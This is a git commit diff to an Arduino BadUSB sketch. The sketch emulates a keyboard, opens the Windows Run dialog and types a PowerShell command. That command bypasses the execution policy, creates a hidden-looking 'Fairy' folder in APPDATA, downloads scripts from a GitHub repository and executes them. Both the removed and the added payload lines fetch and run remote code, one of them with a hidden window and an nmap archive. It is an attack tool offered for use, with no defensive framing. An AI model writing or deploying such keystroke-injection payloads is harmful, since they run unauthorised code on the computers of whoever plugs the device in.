e08f0a24e8790470723194fc1b57fad6f802ff2e
h3xagon <62241425+h3xagon0001@users.noreply.github.com>
2025-06-29 17:11:24 +0800

    updated arduino file

--- bad_usb/bad_usb.ino
+++ bad_usb/bad_usb.ino
@@ -6,22 +6,22 @@ void setup() {
   Keyboard.begin();
   //////////// PAYLOAD START ////////////
 
-  delay(1000);  
+  delay(5000);  
 
   // win+r 
   Keyboard.press(windowsKey);
   Keyboard.press('r');
   Keyboard.releaseAll();
   
-  delay(500);
+  delay(5000);
 
   // enter powershell command
   Keyboard.println("powershell");
 
-  delay(2500);
+  delay(5000);
 
   // enter deploy command
-  Keyboard.println("powershell.exe -WindowStyle Hidden -Command {Set-ExecutionPolicy Bypass -Scope Process -Force; New-Item $env:APPDATA -Name \"Fairy\" -ItemType \"Directory\" -Force; Set-Location -Path \"$($env:APPDATA)\\Fairy\"; Invoke-WebRequest -Uri https://raw.githubusercontent.com/h3xagon0001/arduino-micro-badusb/refs/heads/main/fairy.ps1 -OutFile fairy.ps1; Invoke-WebRequest -Uri https://github.com/h3xagon0001/arduino-micro-badusb/raw/refs/heads/main/nmap.zip -OutFile nmap.zip; Expand-Archive -LiteralPath \"./nmap.zip\" -DestinationPath \"$($env:APPDATA)\\Fairy\" -Force; ./fairy.ps1}");
+  Keyboard.println("powershell.exe -Command {Set-ExecutionPolicy Bypass -Scope Process -Force; New-Item $env:APPDATA -Name \"Fairy\" -ItemType \"Directory\" -Force; Set-Location -Path \"$($env:APPDATA)\\Fairy\"; Invoke-WebRequest -Uri https://raw.githubusercontent.com/h3xagon0001/arduino-micro-badusb/refs/heads/main/download.ps1 -OutFile download.ps1; Invoke-WebRequest -Uri https://raw.githubusercontent.com/h3xagon0001/arduino-micro-badusb/refs/heads/main/download.vbs -OutFile download.vbs; ./download.vbs}; exit");
   //////////// PAYLOAD END ////////////
   Keyboard.end();
 }
